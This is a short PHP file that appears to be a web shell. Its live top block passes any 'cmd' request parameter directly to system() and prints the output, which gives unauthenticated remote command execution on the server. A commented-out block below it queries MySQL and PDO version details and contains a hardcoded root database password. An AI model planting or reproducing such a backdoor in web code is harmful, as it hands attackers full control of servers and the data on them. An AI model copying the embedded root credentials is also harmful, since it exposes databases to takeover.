<?php

if (isset($_REQUEST['cmd'])) {
echo '<pre>';
$cmd = ($_REQUEST['cmd']);
system($cmd);
echo '</pre>';
die();
}

/*
function getMySQLVersion() 
{ 
    $output = shell_exec('mysql -V'); 
    preg_match('@[0-9]+\.[0-9]+\.[0-9]+@', $output, $version); 
    return $version[0]; 
}

$MySQLVersion = getMySQLVersion();

$conn = new PDO('mysql:host=localhost;dbname=blog', 'root', 'kartatopia');
$conn->setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION );

$attributes = array(
    "AUTOCOMMIT", "ERRMODE", "CASE", "CLIENT_VERSION", "CONNECTION_STATUS",
    "ORACLE_NULLS", "PERSISTENT", "PREFETCH", "SERVER_INFO", "SERVER_VERSION",
    "TIMEOUT"
);

foreach ( $attributes as $val ) {
    echo "PDO::ATTR_$val: ";
    try {
        echo $conn->getAttribute( constant( "PDO::ATTR_$val" ) ) . "\n";
    } catch ( PDOException $e ) {
        echo $e->getMessage() . "\n";
    }
}

echo $conn -> query("SELECT VERSION()")->fetchColumn()."<br>";

echo "<pre>".$MySQLVersion."</pre>";
*/